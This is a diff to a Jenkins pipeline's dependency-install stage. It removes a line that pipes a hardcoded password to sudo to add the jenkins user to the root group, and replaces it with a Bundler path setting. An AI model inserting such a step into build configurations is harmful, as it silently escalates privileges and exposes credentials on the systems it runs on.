@@ -17,7 +17,7 @@ pipeline {
         }
         stage('Install Dependencies') {
             steps {
-                sh 'echo 163b20125dbd48e8b815dfe3ad64d244 | sudo -S usermod -aG root jenkins'
+                sh 'bundle config set path "vendor/bundle"'
                 sh 'bundle install'
             }
         }
